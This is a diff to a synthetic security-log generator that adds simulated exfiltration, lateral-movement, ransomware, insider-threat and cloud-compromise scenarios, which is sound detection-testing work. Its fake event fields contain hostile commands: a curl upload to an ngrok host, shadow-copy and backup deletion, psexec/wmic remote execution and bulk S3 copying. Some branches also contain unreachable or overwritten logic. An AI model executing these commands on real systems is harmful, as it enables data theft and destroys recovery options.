@@ -142,13 +142,25 @@ functions:
         var _at=["pan:traffic","syslog","WinEventLog:Security","crowdstrike:falcon:event","okta:system","cisco:asa","aws:cloudtrail","fortigate:traffic","dns:query","prometheus:metrics"];var st="pan:traffic";var scen=null;
         var _explicit=false;var _utpl=null;var _av=false;try{var t=JSON.parse(__e._raw);if(t.sourcetype){st=t.sourcetype;_explicit=true}if(t.scenario)scen=t.scenario;if(t.template)_utpl=t.template}catch(e){__e._raw=__e._raw.replace(/\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b/g,function(){return pip()}).replace(/20\d{2}-\d{2}-\d{2}T[\d:.]+Z?/g,function(){return iso()}).replace(/[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}/gi,function(){return uu()});__e._time=Date.now()/1000;__e.source="datatap";__e.host=hn();_av=true}
         if(!_av){if(scen)S.mode=scen
-        if(S.mode==="brute-force"){var mins=Math.floor(Date.now()/60000)%10;if(mins<2)S.ph=0;else if(mins<6)S.ph=1;else if(mins<7)S.ph=2;else S.ph=3}
+        var mins=Math.floor(Date.now()/60000)%10;
+        if(S.mode==="brute-force"){if(mins<2)S.ph=0;else if(mins<6)S.ph=1;else if(mins<7)S.ph=2;else S.ph=3}
+        if(S.mode==="exfiltration"){if(mins<3)S.ph=0;else if(mins<5)S.ph=1;else if(mins<7)S.ph=2;else S.ph=3}
+        if(S.mode==="lateral-movement"){if(mins<2)S.ph=0;else if(mins<4)S.ph=1;else if(mins<7)S.ph=2;else S.ph=3}
+        if(S.mode==="ransomware"){if(mins<2)S.ph=0;else if(mins<4)S.ph=1;else if(mins<6)S.ph=2;else S.ph=3}
+        if(S.mode==="insider-threat"){if(mins<3)S.ph=0;else if(mins<5)S.ph=1;else if(mins<7)S.ph=2;else S.ph=3}
+        if(S.mode==="cloud-compromise"){if(mins<2)S.ph=0;else if(mins<5)S.ph=1;else if(mins<7)S.ph=2;else S.ph=3}
         if(S.mode==="stream"&&!_explicit){if(S.rush&&Math.random()<0.4)st=pk(["okta:system","azure:aad:signin","duo:authentication","WinEventLog:Security"]);if(S.night&&Math.random()<0.3)st=pk(["syslog","linux:auditd","kubernetes:audit","prometheus:metrics"])}
         var _stream=(S.mode==="stream");var _sess=_pool[Math.floor(Math.random()*_pool.length)];var sip=_stream?_sess.rip:A.atk.ip,dip=_stream?rip():A.tgt.ip,usr=_stream?_sess.u:A.vic.u,vip=_stream?_sess.ip:A.vic.ip,_uem=_stream?_sess.em:A.vic.em,_uh=_stream?_sess.h:A.vic.h;
         if(_utpl){var _up=_utpl.split("|");var _uf=_up[0];var _ut=_up.slice(1).join("|");__e._raw=(_uf==="j")?genJSON(_ut):expand(_ut)}else if(st==="pan:traffic"){
           var act=pk(["allow","allow","allow","allow","allow","allow","allow","allow","deny","drop","reset-both"]);
           if(S.mode==="brute-force"&&S.ph===0)act="deny";
           if(S.mode==="brute-force"&&S.ph>=2)act="allow";
+          if(S.mode==="exfiltration"&&S.ph>=1)act="allow";
+          if(S.mode==="exfiltration"&&S.ph>=2){act="allow";br=ri(500000,5000000);}
+          if(S.mode==="lateral-movement"&&S.ph===0)act="deny";
+          if(S.mode==="lateral-movement"&&S.ph>=1)act="allow";
+          if(S.mode==="ransomware"&&S.ph>=2)act="allow";
+          if(S.mode==="insider-threat")act="allow";
           var psub=(act==="allow")?pk(["end","end","end","start"]):(act==="deny")?"deny":(act==="drop")?"drop":"end";
           var br=(act==="deny"||act==="drop")?0:ri(40,262144);
           var endr=(act==="deny")?"policy-deny":(act==="drop")?"threat":pk(["tcp-fin","tcp-rst-from-client","tcp-rst-from-server","aged-out"]);
@@ -174,6 +186,13 @@ functions:
           var eid;var w=Math.random();
           if(S.mode==="brute-force"&&S.ph===1)eid=4625;
           else if(S.mode==="brute-force"&&S.ph===2)eid=4624;
+          else if(S.mode==="lateral-movement"&&S.ph<=1)eid=4625;
+          else if(S.mode==="lateral-movement"&&S.ph===2)eid=pk([4624,4624,4648]);
+          else if(S.mode==="lateral-movement"&&S.ph===3)eid=pk([4672,4688]);
+          else if(S.mode==="ransomware"&&S.ph<=1)eid=4624;
+          else if(S.mode==="ransomware"&&S.ph===2)eid=pk([4672,4688]);
+          else if(S.mode==="ransomware"&&S.ph===3)eid=pk([4688,4697]);
+          else if(S.mode==="insider-threat")eid=pk([4624,4634,4663]);
           else if(w<0.35)eid=4624;else if(w<0.55)eid=4625;else if(w<0.7)eid=4688;else if(w<0.8)eid=4672;else eid=pk([4720,4740,4634,4648,4697]);
           var comp=pk(["DC01","DC02","DC03","FS01","SRV-SQL01","SRV-WEB01","SRV-APP01"])+".corp.contoso.com";
           var dom=pk(["CORP","CONTOSO","ACME","NORTHWIND","FABRIKAM"]);
@@ -188,6 +207,11 @@ functions:
           var cids=["a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6","b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6a1"];
           var cw=Math.random();var ev,ce={};
           if(S.mode==="brute-force"&&S.ph>=3){ev="DetectionSummaryEvent";ce={DetectName:pk(["Credential Stuffing","Brute Force"]),Tactic:"CredentialAccess",Technique:"T1110",CommandLine:pk(["powershell -exec bypass","cmd /c net user /domain"]),SHA256HashData:hx(64)};}
+          else if(S.mode==="exfiltration"&&S.ph>=2){ev="DetectionSummaryEvent";ce={DetectName:pk(["DNS Tunneling Detected","Suspicious Data Transfer","Large File Exfiltration"]),Tactic:"Exfiltration",Technique:pk(["T1048","T1041","T1567"]),CommandLine:pk(["powershell -c Invoke-WebRequest","curl -X POST https://"+hx(8)+".ngrok.io/upload","python3 exfil.py --dns"]),SHA256HashData:hx(64)};}
+          else if(S.mode==="lateral-movement"&&S.ph>=2){ev=pk(["DetectionSummaryEvent","NetworkConnectIP4"]);if(ev==="DetectionSummaryEvent")ce={DetectName:pk(["Lateral Movement via RDP","PsExec Remote Execution","WMI Remote Process"]),Tactic:"LateralMovement",Technique:pk(["T1021.001","T1021.002","T1047"]),CommandLine:pk(["psexec.exe \\\\\\\\"+A.tgt.h+" cmd","wmic /node:"+A.tgt.ip+" process call create","mstsc /v:"+A.tgt.ip]),SHA256HashData:hx(64)};else ce={LocalAddressIP4:vip,RemoteAddressIP4:A.tgt.ip,RemotePort:pk([3389,445,135,5985]),Protocol:"6",ConnectionDirection:"1"};}
+          else if(S.mode==="ransomware"&&S.ph>=2){ev="DetectionSummaryEvent";ce={DetectName:pk(["Ransomware Behavior Detected","File Encryption Activity","Suspicious Volume Shadow Delete"]),Tactic:pk(["Impact","Execution"]),Technique:pk(["T1486","T1059","T1490"]),CommandLine:pk(["vssadmin delete shadows /all /quiet","cipher /e /s:C:\\\\Users","bcdedit /set {default} recoveryenabled No","wbadmin delete catalog -quiet"]),SHA256HashData:hx(64),SeverityName:"Critical"};}
+          else if(S.mode==="insider-threat"&&S.ph>=1){ev=pk(["ProcessRollup2","DnsRequest"]);if(ev==="ProcessRollup2")ce={CommandLine:pk(["7z a archive.7z C:\\\\Users\\\\"+usr+"\\\\Documents","robocopy \\\\\\\\fileserver\\\\share C:\\\\temp /MIR","azcopy cp 'C:\\\\data' 'https://blob.core.windows.net'"]),SHA256HashData:hx(64),ParentBaseFileName:"explorer.exe"};else ce={DomainName:pk(["mega.nz","wetransfer.com","drive.google.com","dropbox.com",hx(10)+".xyz"]),RequestType:"A"};}
+          else if(S.mode==="cloud-compromise"&&S.ph>=3){ev="DetectionSummaryEvent";ce={DetectName:pk(["Cloud Credential Abuse","Unusual API Activity","Suspicious Cloud Resource Access"]),Tactic:"CredentialAccess",Technique:pk(["T1078","T1528","T1537"]),CommandLine:pk(["aws sts get-caller-identity","aws s3 cp s3://sensitive-data . --recursive","az login --service-principal"]),SHA256HashData:hx(64)};}
           else if(cw<0.3){ev="ProcessRollup2";ce={CommandLine:pk(["cmd.exe /c whoami","powershell.exe -ep bypass","svchost.exe -k netsvcs","python3 app.py"]),SHA256HashData:hx(64),ParentBaseFileName:pk(["explorer.exe","svchost.exe","services.exe"])};}
           else if(cw<0.5){ev="DnsRequest";ce={DomainName:pk(["google.com","login.microsoftonline.com","s3.amazonaws.com","github.com",hx(12)+".xyz"]),RequestType:pk(["A","AAAA","CNAME"])};}
           else if(cw<0.7){ev="NetworkConnectIP4";ce={LocalAddressIP4:pip(),RemoteAddressIP4:_stream?rip():sip,RemotePort:wp(),Protocol:"6",ConnectionDirection:pk(["1","0"])};}
@@ -199,6 +223,10 @@ functions:
           var _osel;
           if(S.mode==="brute-force"&&S.ph===1)_osel={e:"user.session.start",s:"WARN",d:"User login to Okta",r:["FAILURE"],t:"AppInstance"};
           else if(S.mode==="brute-force"&&S.ph===2)_osel={e:"user.session.start",s:"INFO",d:"User login to Okta",r:["SUCCESS"],t:"AppInstance"};
+          else if(S.mode==="insider-threat"&&S.ph>=1)_osel={e:pk(["user.authentication.sso","app.generic.unauth_app_access_attempt"]),s:"WARN",d:"Unusual app access",r:["SUCCESS","SUCCESS","FAILURE"],t:"AppInstance"};
+          else if(S.mode==="cloud-compromise"&&S.ph<=1)_osel={e:"user.session.start",s:"WARN",d:"Login from unusual location",r:["SUCCESS"],t:"AppInstance"};
+          else if(S.mode==="cloud-compromise"&&S.ph>=2)_osel={e:"user.authentication.sso",s:"WARN",d:"SSO to cloud console",r:["SUCCESS"],t:"AppInstance"};
+          else if(S.mode==="lateral-movement"&&S.ph>=2)_osel={e:"user.session.start",s:"INFO",d:"User login to Okta",r:["SUCCESS"],t:"AppInstance"};
           else _osel=pk(_oktaMap);
           var oevt=_osel.e;var osev=_osel.s;var oresult=pk(_osel.r);
           var oreason=(oresult==="FAILURE")?pk(["INVALID_CREDENTIALS","ACCOUNT_LOCKED","VERIFICATION_ERROR","PASSWORD_EXPIRED"]):"";
@@ -221,7 +249,15 @@ functions:
           __e._raw=iso()+" "+pk(["ASA-FW","ASA-DC","ASA-BR","ASA-VPN","ASA-DMZ"])+"-"+String(ri(1,99)).padStart(2,"0")+"."+pk(doms)+" %ASA-"+asev+"-"+acode+": "+amsg;
         }else if(st==="aws:cloudtrail"){
           var _ctMap={"ec2.amazonaws.com":["DescribeInstances","RunInstances","StopInstances","TerminateInstances","AuthorizeSecurityGroupIngress","CreateSecurityGroup","DescribeSecurityGroups"],"s3.amazonaws.com":["PutObject","GetObject","DeleteObject","ListBuckets","DeleteBucket","CreateBucket","GetBucketPolicy"],"iam.amazonaws.com":["CreateUser","DeleteUser","AttachUserPolicy","CreateRole","ListUsers","PutUserPolicy","CreateAccessKey"],"sts.amazonaws.com":["AssumeRole","GetCallerIdentity","AssumeRoleWithSAML","GetSessionToken"],"lambda.amazonaws.com":["Invoke","CreateFunction","UpdateFunctionCode","DeleteFunction","ListFunctions"],"rds.amazonaws.com":["CreateDBInstance","DeleteDBInstance","DescribeDBInstances","ModifyDBInstance","CreateDBSnapshot"],"kms.amazonaws.com":["Encrypt","Decrypt","GenerateDataKey","CreateKey","DescribeKey","ScheduleKeyDeletion"],"cloudtrail.amazonaws.com":["CreateTrail","StopLogging","LookupEvents","DescribeTrails"]};
-          var csrc=pk(Object.keys(_ctMap));var cevt=pk(_ctMap[csrc]);
+          var csrc,cevt;
+          if(S.mode==="exfiltration"&&S.ph>=1){csrc="s3.amazonaws.com";cevt=pk(["GetObject","GetObject","GetObject","ListBuckets","GetBucketPolicy"]);}
+          else if(S.mode==="exfiltration"&&S.ph>=2){csrc=pk(["s3.amazonaws.com","s3.amazonaws.com","cloudtrail.amazonaws.com"]);cevt=(csrc==="cloudtrail.amazonaws.com")?"StopLogging":pk(["GetObject","DeleteObject"]);}
+          else if(S.mode==="cloud-compromise"&&S.ph===0){csrc="sts.amazonaws.com";cevt="GetCallerIdentity";}
+          else if(S.mode==="cloud-compromise"&&S.ph===1){csrc="iam.amazonaws.com";cevt=pk(["CreateAccessKey","CreateUser","AttachUserPolicy"]);}
+          else if(S.mode==="cloud-compromise"&&S.ph===2){csrc=pk(["s3.amazonaws.com","ec2.amazonaws.com"]);cevt=(csrc==="s3.amazonaws.com")?pk(["GetObject","ListBuckets"]):pk(["RunInstances","DescribeInstances"]);}
+          else if(S.mode==="cloud-compromise"&&S.ph===3){csrc=pk(["s3.amazonaws.com","cloudtrail.amazonaws.com"]);cevt=(csrc==="cloudtrail.amazonaws.com")?"StopLogging":pk(["GetObject","GetObject","DeleteBucket"]);}
+          else if(S.mode==="insider-threat"&&S.ph>=1){csrc="s3.amazonaws.com";cevt=pk(["GetObject","GetObject","GetObject","ListBuckets"]);}
+          else{csrc=pk(Object.keys(_ctMap));cevt=pk(_ctMap[csrc]);}
           var cacct=String(ri(100000000000,999999999999));var cusr=_stream?nm():usr;
           var ctype=pk(["IAMUser","IAMUser","AssumedRole","AssumedRole","Root"]);
           var carn=(ctype==="Root")?"arn:aws:iam::"+cacct+":root":(ctype==="IAMUser")?"arn:aws:iam::"+cacct+":user/"+cusr:"arn:aws:iam::"+cacct+":assumed-role/"+pk(["AdminRole","ReadOnlyRole","LambdaExecRole","CrossAccountRole"])+"/"+cusr;
